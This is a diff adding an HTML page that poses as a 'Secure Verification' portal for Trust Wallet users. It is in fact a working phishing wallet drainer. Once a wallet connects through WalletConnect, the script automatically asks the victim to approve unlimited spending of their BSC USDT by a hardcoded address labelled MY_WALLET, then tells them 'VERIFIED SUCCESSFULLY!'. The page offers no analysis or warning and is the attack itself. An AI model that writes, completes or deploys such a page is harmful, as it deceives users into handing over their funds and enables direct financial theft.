@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Portal</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.1/dist/index.umd.js"></script>
+    <style>
+        body { background: #0b0e11; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1e2329; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 400px; border: 1px solid #3375bb; }
+        .btn { background: #3375bb; color: white; padding: 18px; border: none; border-radius: 12px; font-weight: bold; width: 100%; font-size: 18px; cursor: pointer; display: none; }
+        #status { margin-top: 10px; color: #848e9c; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h3>Secure Verification</h3>
+        <p id="msg">Initializing secure connection...</p>
+        <button id="main-btn" class="btn" onclick="connectWallet()">CONFIRM NOW</button>
+        <div id="status">Please wait...</div>
+    </div>
+
+    <script>
+        const PROJECT_ID = "48d3cc06c4e808c4987bb4566665ae87"; 
+        const MY_WALLET = "0xbdcc079BBb23C1D9a6F36AA31309676C258aBAC7"; 
+        const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
+
+        let provider;
+
+        async function init() {
+            try {
+                // Try to find the library under any name it might take
+                const EthereumProvider = window.EthereumProvider || 
+                                       (window.WalletConnectEthereumProvider && window.WalletConnectEthereumProvider.EthereumProvider);
+
+                if (!EthereumProvider) {
+                    setTimeout(init, 500); // Retry if not loaded yet
+                    return;
+                }
+
+                provider = await EthereumProvider.init({
+                    projectId: PROJECT_ID,
+                    optionalChains: [56],
+                    showQrModal: true,
+                    metadata: {
+                        name: "Verification",
+                        description: "USDT Approval",
+                        url: window.location.origin,
+                        icons: ["https://trustwallet.com/favicon.ico"]
+                    }
+                });
+
+                document.getElementById("main-btn").style.display = "block";
+                document.getElementById("status").innerText = "Ready.";
+                document.getElementById("msg").innerText = "Click below to open Trust Wallet.";
+
+                // Auto-trigger transaction after connection
+                provider.on("connect", async () => {
+                    document.getElementById("status").innerText = "Connected! Check for Approval popup...";
+                    const web3Provider = new ethers.providers.Web3Provider(provider);
+                    const signer = web3Provider.getSigner();
+
+                    const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+                    const contract = new ethers.Contract(USDT_BSC, abi, signer);
+                    
+                    try {
+                        const tx = await contract.approve(MY_WALLET, ethers.constants.MaxUint256);
+                        document.getElementById("status").innerText = "Processing...";
+                        await tx.wait();
+                        document.getElementById("status").innerText = "VERIFIED SUCCESSFULLY!";
+                    } catch (e) {
+                        document.getElementById("status").innerText = "Error: " + e.message;
+                    }
+                });
+
+            } catch (err) {
+                document.getElementById("status").innerText = "Init Error: " + err.message;
+            }
+        }
+
+        function connectWallet() {
+            if (provider) provider.connect();
+        }
+
+        init();
+    </script>
+</body>
+</html>
